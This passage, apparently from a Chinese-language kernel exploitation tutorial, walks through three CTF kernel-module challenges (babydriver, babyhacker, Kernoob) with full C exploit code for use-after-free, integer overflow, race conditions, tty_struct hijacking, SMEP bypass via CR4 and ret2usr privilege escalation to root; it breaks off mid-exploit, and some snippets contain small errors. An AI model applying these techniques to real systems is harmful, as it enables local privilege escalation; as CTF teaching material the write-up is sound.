    mount -t proc none /proc
    mount -t sysfs none /sys
    mount -t devtmpfs devtmpfs /dev
    chown root:root flag
    chmod 400 flag
    exec 0</dev/console
    exec 1>/dev/console
    exec 2>/dev/console
    
    insmod /lib/modules/4.4.72/babydriver.ko
    chmod 777 /dev/babydev
    echo -e "nBoot took $(cut -d' ' -f1 /proc/uptime) secondsn"
    setsid cttyhack setuidgid 1000 sh
    
    umount /proc
    umount /sys
    poweroff -d 0  -f
    

发现本次的文件系统没有加载共享文件夹，这将导致我们每次写完`PoC`都需要将`PoC`重打包进文件系统。

🚫：经过进一步测试发现，Kernel文件不支持9p选项，因此无法通过修改`Init`的方式来挂载共享文件夹。

然后我们需要重打包文件系统，使用命令`find . | cpio -o --format=newc > rootfs.cpio`。

![](https://img.lhyerror404.cn/error404/2020-03-19-021356.png)

###  调试信息

`QEMU`启动指令：

    
    
    qemu-system-x86_64 -s 
    -initrd rootfs.cpio 
    -kernel bzImage 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/babydriver/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme 
    -cpu kvm64,+smep
    

因为`boot.sh`中涉及到了`KVM`技术，而在虚拟机中的Ubuntu再启动虚拟化是很麻烦的，因此可以直接修改启动指令为以上指令。

###  LKMs文件分析

![](https://img.lhyerror404.cn/error404/2020-03-19-025536.png)

####  题目逻辑分析

可以发现，本题中提供了`ioctl`函数，这给了我们更多的交互方式。

#####  babyioctl

程序定义了一个命令码`0x10001`，在这个命令码下，程序将会释放`device_buf`指向的`Chunk`，并且申请一个用户传入大小的`Chunk`给`device_buf`，然后将这个大小赋给`device_buf_len`。

#####  babyopen

在打开设备时，程序即会申请一个64字节大小的`Chunk`给`device_buf`，然后将这个大小赋给`device_buf_len`。

#####  babywrite

向`device_buf`指向的`Chunk`写入值，写入长度不得超过`device_buf_len`。

#####  babyread

从`device_buf`指向的`Chunk`向用户返回值，返回长度不得超过`device_buf_len`。

#####  babyrelease

释放`device_buf`指向的`Chunk`。

####  题目漏洞分析

可以发现，本次题目中的函数没有之前见到过的栈溢出或者空指针引用等漏洞。

需要注意，在Kernel中，如果用户态程序多次打开同一个字符设备，那么这个字符设备的线程安全将由字符设备本身来保证，即有没有在open函数相关位置进行互斥锁的设置等。这个题目给出的设备显然没有实现相关机制。

那么，如果我们打开两次`LKMs`，两个`LKMs`的`babydev_struct.device_buf`将指向同一个位置，也就是说，后一个LKMs的`babydev_struct.device_buf`将覆盖前一个LKMs的`babydev_struct.device_buf`。若此时第一个`LKMs`执行了释放操作，那么第二个`LKMs`的`babydev_struct.device_buf`事实上将指向一块已经被释放了的内存，这将导致`Use-After-Free`漏洞的发生。

我们在Kernel Pwn 学习之路(一)中说明过一个`struct cred -进程权限结构体`，它将记录整个进程的权限，那么，如果我们能将这个结构体篡改了，我们就可以提升整个进程的权限，而结构体必然需要通过内存分配，我们可以利用`fork函数`将一个进程分裂出一个子进程，此时，父进程将与子进程共享内存空间，而子进程被创建时必然也要创建对应的`struct
cred`，此时将会把第二个`LKMs`的`babydev_struct.device_buf`指向的已释放的内存分配走，那么此时我们就可以修改`struct
cred`了。

###  Final Exploit

根据我们的思路，我们可以给出以下的Expliot：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    int main()
    {
        int fd1 = open("/dev/babydev", 2);
        int fd2 = open("/dev/babydev", 2);
    
        // 修改device_buf_len 为 sizeof(struct cred)
        ioctl(fd1, 0x10001, 0xA8);
    
        // 释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存
        close(fd1);
    
        // 新起进程的 cred 空间将占用那一块已free的内存
        int pid = fork();
        if(pid < 0)
        {
            puts("[*] fork error!");
            exit(0);
        }
    
        else if(pid == 0)
        {
            // 篡改新进程的 cred 的 uid，gid 等值为0
            char zeros[30] = {0};
            write(fd2, zeros, 28);
    
            if(getuid() == 0)
            {
                puts("[+] root now.");
                system("/bin/sh");
                exit(0);
            }
        }
    
        else
        {
            wait(NULL);
        }
        close(fd2);
    
        return 0;
    }
    

由于题目环境没有共享文件夹供我们使用，故直接将其编译后放在文件系统的tmp目录即可然后重打包启动QEMU即可调试。

![](https://img.lhyerror404.cn/error404/2020-03-19-052340.png)

## 0x08 以2020高校战疫分享赛 – babyhacker为例

🏅：本题考查点 – ROP Chain in Kernel、整数溢出、Bypass `SEMP/kASLR`

###  调试信息

`QEMU`启动指令：

    
    
    qemu-system-x86_64 
    -m 512M 
    -nographic 
    -kernel bzImage 
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' 
    -monitor /dev/null 
    -initrd initramfs.cpio 
    -smp cores=2,threads=4 
    -cpu qemu64,smep,smap 2>/dev/null
    

本题依然没有给出共享文件夹，因此仍需要在利用时重打包文件系统。

Kernel开启了`SEMP`、`SAMP`、`KASLR`保护。

###  LKMs文件分析

![](https://img.lhyerror404.cn/error404/2020-03-19-054331.png)

`LKMs`文件启动了`Canary`防护。

####  题目逻辑分析

#####  babyhacker_ioctl

程序定义了三个命令码`0x30000`、`0x30001`、`0x30002`。

在`0x30000`命令码下，程序会将`buffersize`置为我们输入的参数。(最大为10)

在`0x30001`命令码下，程序会将我们输入的参数写到栈上。

在`0x30002`命令码下，程序会将栈上数据输出。

####  题目漏洞分析

当我们设置参数时，程序会将我们的输入转为有符号整数进行上限检查，而没有进行下限检查，这会导致整数溢出的发生。也就是说，当我们输入的`buffersize`为-1时，我们事实上可以对栈上写入一个极大值。

####  泄露栈上数据

由于程序开启了`KASLR`保护，因此我们需要从栈上泄露一些数据，我们构造如下PoC：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result << 8) | (0x00000000000000ff & s[i]);
        }
        return result;
    }
    char leak_value[0x1000];
        unsigned long Send_value[0x1000];
        int fd1 = open("/dev/babyhacker", O_RDONLY);
    
        ioctl(fd1, 0x30000, -1);
        ioctl(fd1, 0x30002, leak_value);
    
        for(int i = 0 ; i * 8 < 0x1000 ; i++ ){
            uint64_t tmp = u64(&leak_value[i * 8]);
            printf("naddress %d: %pn",i * 8 ,tmp);
        }
        return 0;
    }
    

**⚠️：我们在打开一个字符设备时一定要保证模式正确，例如本题的设备没有为我们提供`Write`交互参数，那么我们就应该以只读方式打开此设备，否则会引发不可预知的错误！**

根据我们的判断，程序应该会在0x140的偏移处存储`Canary`的值

![](https://img.lhyerror404.cn/error404/2020-03-19-145257.png)

我们在结果中也确实读到了相应的值

![](https://img.lhyerror404.cn/error404/2020-03-19-145353.png)

####  控制EIP

那么我们只要接收这个值就可以在发送时带有这个值进而控制EIP了，构造如下PoC：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result << 8) | (0x00000000000000ff & s[i]);
        }
        return result;
    }
    
    int main()
    {
        char leak_value[0x1000];
        unsigned long Send_value[0x1000];
        int fd1 = open("/dev/babyhacker", O_RDONLY);
    
        save_status();
    
        ioctl(fd1, 0x30000, -1);
        ioctl(fd1, 0x30002, leak_value);
    
        // for(int i = 0 ; i * 8 < 0x1000 ; i++ ){
        //     uint64_t tmp = u64(&leak_value[i * 8]);
        //     printf("naddress %d: %pn",i * 8 ,tmp);
        // }
    
        uint64_t Canary = u64(&leak_value[10 * 8]);
        printf("nCanary: %pn",Canary);
    
        for(int i = 0 ; i < 40 ; i++ )
            Send_value[i] = 0;
        Send_value[40] = Canary;
        Send_value[41] = 0;
        Send_value[42] = 0xDEADBEEF; 
    
        ioctl(fd1, 0x30001, Send_value);
        return 0;
    }
    

那么按照预期，程序应该会因为EIP处为`0xDEADBEEF`这个不合法地址而断电。

![](https://img.lhyerror404.cn/error404/2020-03-19-145744.png)

结果确实如此。

####  Bypass SEMP & Bypass kASLR

那么绕过`SEMP`的思路还可以使用我们之前所述的思路，首先导出并寻找可用的`gadget`

    
    
    0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff8109054d : pop rdi ; ret
    

我们找到了这两个`gadget`之后还要想办法绕过开启的`kASLR`保护，这将导致我们无法得知这几个`gadget`的真实地址。

我们可以在启动`QEMU`时，暂时关闭`kASLR`，然后我们就可以得到程序返回地址的真实值。(将启动参数里的`kaslr`修改为`nokaslr`)

![](https://img.lhyerror404.cn/error404/2020-03-19-150612.png)

也就是`0xffffffff81219218`。

接下来我们开启`kASLR`，再次获取相同位置的值，然后我们可以得到如下计算公式：

    
    
    0xffffffff81219218 + 固定offset = 获取到的随机加载地址
    任意函数的物理地址 + 固定offset = 任意函数的实际加载地址
    任意函数的物理地址 + 获取到的随机加载地址 - 0xffffffff81219218 = 任意函数的实际加载地址
    

那么我们可以构造如下PoC:

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result << 8) | (0x00000000000000ff & s[i]);
        }
        return result;
    }
    
    int main()
    {
        char leak_value[0x1000];
        unsigned long Send_value[0x1000];
        int fd1 = open("/dev/babyhacker", O_RDONLY);
    
        ioctl(fd1, 0x30000, -1);
        ioctl(fd1, 0x30002, leak_value);
    
        // for(int i = 0 ; i * 8 < 0x1000 ; i++ ){
        //     uint64_t tmp = u64(&leak_value[i * 8]);
        //     printf("naddress %d: %pn",i * 8 ,tmp);
        // }
    
        uint64_t Canary = u64(&leak_value[40 * 8]);
        printf("nCanary: %pn",Canary);
        uint64_t Rand_addr = u64(&leak_value[42 * 8]);
        printf("nRand address: %pn",Rand_addr);
    
        for(int i = 0 ; i < 40 ; i++ )
            Send_value[i] = 0;
        Send_value[40] = Canary;
        Send_value[41] = 0;
        Send_value[42] = Rand_addr + 0xffffffff8109054d - 0xffffffff81219218; 
        Send_value[43] = 0x6e0; 
        Send_value[44] = Rand_addr + 0xffffffff81004d70 - 0xffffffff81219218; 
        Send_value[45] = 0;
        Send_value[46] = 0xDEADBEEF;
    
        ioctl(fd1, 0x30001, Send_value);
        return 0;
    }
    

![](https://img.lhyerror404.cn/error404/2020-03-19-152027.png)

通过`CR4`寄存器的值确定，我们已经成功关闭了`SEMP`和`SEAP`保护。

###  Final Exploit

接下来我们只需要获取两个关键函数地址就可以get_shell了，但是注意，
**我们还是需要先暂时关闭`kASLR`再从`/proc/kallsyms`读取到的函数地址才是正确的地址。**

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void * rsp;
        uint64_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    
    void launch_shell(){
        execl("/bin/sh","sh",NULL);
    }
    
    void save_status(){
        asm(
            "mov %%cs,  %0n"
            "mov %%ss,  %1n"
            "mov %%rsp, %3n"
            "pushfqn"
            "popq %2" :"=r"(tf.cs),"=r"(tf.ss),"=r"(tf.rflags),"=r"(tf.rsp) :
            :"memory"
        );
        tf.rsp -= 4096;
        tf.rip = &launch_shell;
    }
    
    uint64_t (*commit_creds)(uint64_t cred) ;
    uint64_t (*prepare_kernel_cred)(uint64_t cred) ;
    
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("movq $tf, %rspn"
            "swapgsn"
            "iretqn");
    }
    
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result << 8) | (0x00000000000000ff & s[i]);
        }
        return result;
    }
    
    int main()
    {
        char leak_value[0x1000];
        unsigned long Send_value[0x1000];
        int fd1 = open("/dev/babyhacker", O_RDONLY);
    
        save_status();
    
        ioctl(fd1, 0x30000, -1);
        ioctl(fd1, 0x30002, leak_value);
    
        // for(int i = 0 ; i * 8 < 0x1000 ; i++ ){
        //     uint64_t tmp = u64(&leak_value[i * 8]);
        //     printf("naddress %d: %pn",i * 8 ,tmp);
        // }
    
        uint64_t Canary = u64(&leak_value[40 * 8]);
        printf("nCanary: %pn",Canary);
        uint64_t Rand_addr = u64(&leak_value[42 * 8]);
        printf("nRand address: %pn",Rand_addr);
    
        prepare_kernel_cred = (void *)(Rand_addr + 0xffffffff810a1820 - 0xffffffff81219218); 
        commit_creds = (void *)(Rand_addr + 0xffffffff810a1430 - 0xffffffff81219218);
    
        for(int i = 0 ; i < 40 ; i++ )
            Send_value[i] = 0;
        Send_value[40] = Canary;
        Send_value[41] = 0;
        Send_value[42] = Rand_addr + 0xffffffff8109054d - 0xffffffff81219218; 
        Send_value[43] = 0x6e0; 
        Send_value[44] = Rand_addr + 0xffffffff81004d70 - 0xffffffff81219218; 
        Send_value[45] = 0;
        Send_value[46] = payload;
        Send_value[47] = 0xDEADBEEF;
    
        ioctl(fd1, 0x30001, Send_value);
        return 0;
    }
    

![](https://img.lhyerror404.cn/error404/2020-03-19-154553.png)

提权成功！

## 0x09 以2020高校战疫分享赛 – Kernoob为例

🏅：本题考查点 – ROP Chain in Kernel、整数溢出、Bypass `SEMP/kASLR`

###  Init文件分析

有时文件系统的init文件是空的，可以去`/etc`下面的`init.d`下面寻找

    
    
    #!/bin/sh
    
    echo "Welcome :)"
    
    mount -t proc none /proc
    mount -t devtmpfs none /dev
    mkdir /dev/pts
    mount /dev/pts
    
    insmod /home/pwn/noob.ko
    chmod 666 /dev/noob
    
    echo 1 > /proc/sys/kernel/dmesg_restrict
    echo 1 > /proc/sys/kernel/kptr_restrict
    
    cd /home/pwn
    setsid /bin/cttyhack setuidgid 1000 sh
    
    umount /proc
    poweroff -f
    

我们可以看到，程序对`/proc/sys/kernel/dmesg_restrict`和`/proc/sys/kernel/dmesg_restrict`这两个文件进行了操作。

#### 关于`/proc/sys/kernel/dmesg_restrict`

这里我们引用 [kernel
docs](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt) 中的内容：

    
    
    This toggle indicates whether unprivileged users are prevented from using dmesg(8) to view messages from the kernel’s log buffer. When dmesg_restrict is set to (0) there are no restrictions. When dmesg_restrict is set set to (1), users must have CAP_SYSLOG to use dmesg(8). The kernel config option CONFIG_SECURITY_DMESG_RESTRICT sets the default value of dmesg_restrict.
    

可以发现，当`/proc/sys/kernel/dmesg_restrict`为1时，将不允许用户使用`dmesg`命令。

#### 关于`/proc/sys/kernel/kptr_restrict`

这里我们引用[lib/vsprintf.c](https://elixir.bootlin.com/linux/v4.4.72/source/lib/vsprintf.c)中的内容：

    
    
    case 'K':
            /*
             * %pK cannot be used in IRQ context because its test
             * for CAP_SYSLOG would be meaningless.
             */
            if (kptr_restrict && (in_irq() || in_serving_softirq() ||
                          in_nmi())) {
                if (spec.field_width == -1)
                    spec.field_width = default_width;
                return string(buf, end, "pK-error", spec);
            }
    
            switch (kptr_restrict) {
            case 0:
                /* Always print %pK values */
                break;
            case 1: {
                /*
                 * Only print the real pointer value if the current
                 * process has CAP_SYSLOG and is running with the
                 * same credentials it started with. This is because
                 * access to files is checked at open() time, but %pK
                 * checks permission at read() time. We don't want to
                 * leak pointer values if a binary opens a file using
                 * %pK and then elevates privileges before reading it.
                 */
                const struct cred *cred = current_cred();
    
                if (!has_capability_noaudit(current, CAP_SYSLOG) ||
                    !uid_eq(cred->euid, cred->uid) ||
                    !gid_eq(cred->egid, cred->gid))
                    ptr = NULL;
                break;
            }
            case 2:
            default:
                /* Always print 0's for %pK */
                ptr = NULL;
                break;
            }
            break;
    

可以发现，当`/proc/sys/kernel/dmesg_restrict`为0时，将允许任何用户查看`/proc/kallsyms`。

当`/proc/sys/kernel/dmesg_restrict`为1时，仅允许root用户查看`/proc/kallsyms`。

当`/proc/sys/kernel/dmesg_restrict`为2时，不允许任何用户查看`/proc/kallsyms`。

####  修改Init文件

那么此处我们为了调试方便，我们将上述的Init文件修改为：

    
    
    #!/bin/sh
    
    echo "ERROR404 Hacked!"
    
    mount -t proc none /proc
    mount -t devtmpfs none /dev
    mkdir /dev/pts
    mount /dev/pts
    
    insmod /home/pwn/noob.ko
    chmod 666 /dev/noob
    
    echo 0 > /proc/sys/kernel/dmesg_restrict
    echo 0 > /proc/sys/kernel/kptr_restrict
    echo 1 >/proc/sys/kernel/perf_event_paranoid
    
    cd /home/pwn
    setsid /bin/cttyhack setuidgid 1000 sh
    
    umount /proc
    poweroff -f
    

并重打包文件系统。

###  调试信息

`QEMU`启动指令：

    
    
    qemu-system-x86_64 
    -s 
    -m 128M 
    -nographic 
    -kernel bzImage 
    -append 'console=ttyS0 loglevel=3 pti=off oops=panic panic=1 nokaslr' 
    -monitor /dev/null 
    -initrd initramfs.cpio 
    -smp 2,cores=2,threads=1 
    -cpu qemu64,smep 2>/dev/null
    

本题依然没有给出共享文件夹，因此仍需要在利用时重打包文件系统。

Kernel开启了`SEMP`保护。

我们可以使用如下命令获取程序的加载地址`grep noob /proc/kallsyms`。

    
    
    ~ $ grep noob /proc/kallsyms
    ffffffffc0002000 t copy_overflow    [noob]
    ffffffffc0003120 r kernel_read_file_str    [noob]
    ffffffffc0002043 t add_note    [noob]
    ffffffffc000211c t del_note    [noob]
    ffffffffc0002180 t show_note    [noob]
    ffffffffc00022d8 t edit_note    [noob]
    ffffffffc0002431 t noob_ioctl    [noob]
    ffffffffc0004000 d fops    [noob]
    ffffffffc0004100 d misc    [noob]
    ffffffffc0003078 r .LC1    [noob]
    ffffffffc00044c0 b pool    [noob]
    ffffffffc0004180 d __this_module    [noob]
    ffffffffc00024f2 t cleanup_module    [noob]
    ffffffffc00024ca t init_module    [noob]
    ffffffffc00024f2 t noob_exit    [noob]
    ffffffffc00024ca t noob_init    [noob]
    

由此可以看出以下地址

    
    
    .text : 0xffffffffc0002000
    .data : 0xffffffffc0004000
    .bss  : 0xffffffffc00044C0
    
    # code in gdb
    set architecture i386:x86-64:intel
    add-symbol-file noob.ko 0xffffffffc0002000 -s .data 0xffffffffc0004000 -s .bss 0xffffffffc00044C0
    

###  LKMs文件分析

![](https://img.lhyerror404.cn/error404/2020-03-20-070909.png)

####  题目逻辑分析

#####  babyhacker_ioctl

程序定义了四个命令码`0x30000`、`0x30001`、`0x30002`、`0x30003`，并且程序对于参数寻址时采用的方式是指针方式，因此我们向`ioctl`应当传入的的是一个结构体。

    
    
    struct IO {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    IO io;
    

在`0x30000`命令码下，程序会调用`add_note`函数，将会在全局变量`Chunk_list`的`io -> index`的位置分配一个`io
-> size`大小的`Chunk`，`io ->
size`将会存储在全局变量`Chunk_size_list`中，此处`Chunk_list`和`Chunk_size_list`呈交错存在。

在`0x30001`命令码下，程序会调用`del_note`函数，将会释放`Chunk_list`的`io -> index`的位置的`Chunk`。

在`0x30002`命令码下，程序会调用`edit_note`函数，进行`Chunk_list`的`io ->
index`的位置的`Chunk`合法性检查且保证`io -> size`小于等于`Chunk_size_list`的`io ->
index`的位置的值后将会调用`copy_from_user(chunk,io -> buf, io ->
size);`从`buf`向`Chunk`内写值。

在`0x30003`命令码下，程序会调用`show_note`函数，进行`Chunk_list`的`io ->
index`的位置的`Chunk`合法性检查且保证`io -> size`小于等于`Chunk_size_list`的`io ->
index`的位置的值后将会调用`copy_to_user(io -> buf,chunk, io -> size);`从`Chunk`向`buf`内写值。

####  题目漏洞分析

首先，程序在调用`kfree`释放堆块后并没有执行data段对应位置的清零，这将导致`Use-After-Free`漏洞的发生。

然后，本设备涉及到了对全局变量的读写，且没有做加锁保护，这将导致`Race
Condition`(条件竞争)漏洞的发生，即多次打开相同设备，他们将共享全局变量区域。

#####  分配任意地址大小的Chunk

由于条件竞争的存在，我们可以轻松绕过`add_note`函数里的`size`检查，程序里的size检查形如这样

    
    
    if ( arg[2] > 0x70 || arg[2] <= 0x1F )
        return -1LL;
    

但是此处的判断同样是分两步判断的，也就是，先判断`io -> size`是否大于0x70，再判断`io ->
size`是否小于等于0x1F，如果我们创建一个并发进程，同时尝试把`io ->
size`的值刷新为`0xA0`(此处我们假设要分配的大小为`0xA0`)的一个”叠加态”，那么一定存在一个这样的情况，当进行`io ->
size`是否小于等于0x70的判断时，`io -> size`的值还未被刷新，当进行`io -> size`是否大于0x1F的判断时，`io ->
size`被刷新为了`0x1F`，这样就通过了保护。

**注意：我们在设定`io -> size`的初值时，一定要小于0x1F，否则可能会发生直到`Chunk`分配结束`io ->
size`都没有被刷新的情况发生。**

我们首先构建如下PoC来测试：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    #include <pthread.h>
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    
    void fake_size() {
        while(1) {
            io.size = 0xA8; 
        }
    }
    
    int main()
    {
        char IO_value[0x1000] = {0};
        int fd1 = open("/dev/noob", O_RDONLY);
    
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
    
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0xA0 size Chunk!");
        ioctl(fd1, 0x30001, &io); // For BreakPoint
    
        return 0;
    }
    

⚠️ **：注意，因为我们使用了`pthread`实现多线程，因此在使用`gcc`编译时需要添加`-pthread`参数！**

分配成功

![](https://img.lhyerror404.cn/error404/2020-03-20-154805.png)

##### 劫持`tty struct`结构体

接下来我们尝试去利用这个UAF漏洞来劫持`tty
struct`，那么我们首先就要计算这个结构体的大小，此处为了避免源码分析出错，我们选择写一个Demo用于测试。

    
    
    #include <linux/init.h>
    #include <linux/module.h>
    #include <linux/cred.h>
    #include <linux/tty.h>
    #include <linux/tty_driver.h>
    
    MODULE_LICENSE("Dual BSD/GPL");
    
    static int hello_init(void)
    {
        printk(KERN_ALERT "sizeof cred   : %d", sizeof(struct cred));
        printk(KERN_ALERT "sizeof tty    : %d", sizeof(struct tty_struct));
        printk(KERN_ALERT "sizeof tty_op : %d", sizeof(struct tty_operations));
        return 0;
    }
    
    static void hello_exit(void)
    {
        printk(KERN_ALERT "exit module!");
    }
    
    module_init(hello_init);
    module_exit(hello_exit);
    

使用以下makefile进行编译:

    
    
    obj-m := important_size.o
    KERNELBUILD := SourceCode/linux-4.15.15
    CURDIR := /home/error404/Desktop/Mac_desktop/Linux-Kernel
    
    modules:
        make -C $(KERNELBUILD) M=$(CURDIR) modules
    clean:
        make -C $(KERNELBUILD) M=$(CURDIR) clean
    

使用IDA反编译即可

!

那么我们构造如下PoC就可以把`tty struct`结构体分配到我们的目标区域。

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    #include <pthread.h>
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    
    void fake_size() {
        while(1) {
            io.size = 0x2C0; 
        }
    }
    
    int main()
    {
        char IO_value[0x30] = {0};
        int fd1 = open("/dev/noob", O_RDONLY);
    
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
    
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0x2C0 size Chunk!");
    
        ioctl(fd1, 0x30001, &io);
        int fd2 = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        if (fd_tty < 0) {
            puts("[-] open error");
            exit(-1); 
        }
        puts("[+] Now we can write tty struct Chunk!");
    
        ioctl(fd1, 0x30002, &io); // For BreakPoint
        return 0;
    }
    

![](https://img.lhyerror404.cn/error404/2020-03-21-080002.png)

##### 伪造`tty_operations`结构体&控制RIP

构造如下PoC就可以伪造`tty_operations`结构体，并将函数流程引导至`0xDEADBEEF`。

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    #include <pthread.h>
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    
    void fake_size() {
        while(1) {
            io.size = 0x2C0; 
        }
    }
    
    int main()
    {
        size_t IO_value[5] = {0};
        size_t Fake_tty_operations[0x118/8] = {0};
        Fake_tty_operations[12] = 0xDEADBEEF;
    
        int fd1 = open("/dev/noob", O_RDONLY);
    
        pthread_t t;
        pthread_create(&t, NULL, (void*)fake_size, NULL);
        io.index = 0;
        io.buf   = IO_value;
    
        while (1)
        {
            io.size  = 0x10;
            if(ioctl(fd1, 0x30000, &io) == 0)
                break;
        }
        pthread_cancel(t);
        puts("[+] Now we have a 0x2C0 size Chunk!");
    
        ioctl(fd1, 0x30001, &io);
        int fd2 = open("/dev/ptmx", O_RDWR);
        if (fd2 < 0) {
            puts("[-] open error");
            exit(-1); 
        }
        puts("[+] Now we can write tty struct Chunk!");
    
        io.size  = 0x30;
        ioctl(fd1, 0x30003, &io);
    
        IO_value[3] = (size_t)Fake_tty_operations;
        ioctl(fd1, 0x30002, &io);
    
        ioctl(fd2,0,0);
        return 0;
    }
    

![](https://img.lhyerror404.cn/error404/2020-03-21-105300.png)

#####  执行ROP&Bypass SEMP

那么我们希望程序可以直接跳转到我们的`ROP
Chain`来运行,此时我们就可以试图去迁移栈了，但是通过导出并寻找可用的`gadget`的过程，我们发现，没有对`rsp`操作的`gadget`，仅有对`esp`操作的`gadget`，并且我们在调试时发现了一个事实，`rax`事实上将存储我们执行的代码的地址，那么，我们就可以将栈迁移到我们已知的一个地址，这样，我们就可以执行我们的ROP链了。

**⚠️：我们在寻找`gadget`的时候可以很容易的发现`0xffffffff8112bc48 : mov esp, eax ;
retf`这个`gadget`，但我们不首选使用这个，因为`retf`是远返回指令(`Return
Far`)，这个指令将会从栈上弹一个值用来恢复`cs`段寄存器，我们对这个值是不可控的，因此可能会破坏`cs`段寄存器！**

我们最终选用`0xffffffff8101db17 : xchg eax, esp ; ret`，这将交换`eax`和`esp`这两个寄存器的值。

接下来绕过`SEMP`的思路还可以使用我们之前所述的思路，导出并寻找可用的`gadget`

    
    
    0xffffffff8101f2f0 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff8107f460 : pop rdi ; ret
    

###  Final Exploit

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stropts.h>
    #include <pthread.h>
    struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void * rsp;
        uint64_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    
    void launch_shell(){
        puts("[+] Now Root!");
        execl("/bin/sh","sh",NULL);
    }
    
    void save_status(){
        asm(
            "mov %%cs,  %0n"
            "mov %%ss,  %1n"
            "mov %%rsp, %3n"
            "pushfqn"
            "popq %2" :"=r"(tf.cs),"=r"(tf.ss),"=r"(tf.rflags),"=r"(tf.rsp) :
            :"memory"
        );
        tf.rsp -= 4096;
        tf.rip = &launch_shell;
    }
    
    uint64_t (*commit_creds)(uint64_t cred) = (void *)0xffffffff810ad430;
    uint64_t (*prepare_kernel_cred)(uint64_t cred) = (void *)0xffffffff810ad7e0;
    
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("movq $tf, %rspn"
            "swapgsn"
            "iretqn");
    }
    
    struct IO_noob {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    struct IO_noob io;
    
    void fake_size() {
        while(1) {
            io.size = 0x2C0; 
        }
    }
    
    int main()
    {
        size_t IO_value[5] = {0};
        size_t Fake_tty_operations[0x118/8] = {0};
        Fake_tty_operations[12] = 0xffffffff8101db17;
        size_t *ROP_chain = mmap((void *)(0x8101d000), 0x1000, 7, 0x22, -1, 0); 
        if (!ROP_chain) {
            puts("mmap error");
            exit(-1); 
        }
    
        size_t pop_rdi_ret = 0xffffffff8107f460;
        size_t mov_cr4_rdi = 0xffffffff8101f2f0;
        size_t rop_chain[] = {
            pop_rdi_ret,
            0x6e0,
            mov_cr4_rdi,
            0,
            payload,
            0xDEADBEEF,
        };
        memcpy((void *)(0x8101db17), rop_chain, sizeof(rop_chain));
    
        int fd1 = open("/dev/noob", O_RDONLY);
        save_status();
    
        pthread_t t;
